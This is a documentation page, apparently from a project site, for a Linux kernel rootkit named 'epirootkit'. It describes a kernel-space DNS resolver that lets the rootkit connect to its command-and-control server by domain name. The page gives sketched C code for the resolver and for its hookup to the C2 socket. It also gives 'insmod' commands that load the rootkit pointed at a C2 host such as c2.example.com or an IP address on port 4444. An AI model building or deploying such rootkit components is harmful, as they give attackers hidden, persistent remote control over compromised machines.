---
title: "DNS Resolution"
description: "Kernel-space domain name resolution for flexible C2 connectivity"
icon: "globe"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 514
---

# DNS Resolution

Kernel-space DNS resolver for flexible C2 server connections using domain names.

## How It Works

1. **Detect address type** - IP vs domain name
2. **Create UDP socket** in kernel space
3. **Query 8.8.8.8:53** with A record lookup
4. **Parse response** and extract IPv4 address

## Implementation

```c
int kernel_dns_resolve(const char *hostname, u32 *ip_addr)
{
    // Create UDP socket
    sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    
    // Build DNS query packet
    dns_query = build_dns_query(hostname);
    
    // Send to 8.8.8.8:53
    kernel_sendmsg(sock, &msg, iov, 1, query_len);
    
    // Receive and parse response
    kernel_recvmsg(sock, &msg, MSG_WAITALL);
    *ip_addr = parse_dns_response(response_buf);
    
    sock_release(sock);
    return 0;
}
```

## Usage

### Domain Name Configuration
```bash
# Use domain name for C2 server
sudo insmod epirootkit.ko address=c2.example.com port=4444
```

### IP Address (bypasses DNS)
```bash
# Direct IP connection
sudo insmod epirootkit.ko address=192.168.1.100 port=4444
```

## Integration

Automatic detection in socket connection:
```c
if (!in4_pton(config.address, -1, (u8*)&server_addr.sin_addr.s_addr, -1, NULL)) {
    // Not an IP - resolve domain
    ret = kernel_dns_resolve(config.address, &target_ip);
    if (ret < 0) return ret;
    server_addr.sin_addr.s_addr = target_ip;
}
```

## Technical Details

- **Protocol**: UDP DNS queries
- **Server**: 8.8.8.8:53 (Google DNS)
- **Query type**: A records (IPv4) only
- **Buffer size**: 256 bytes
- **Fallback**: Direct IP if resolution fails

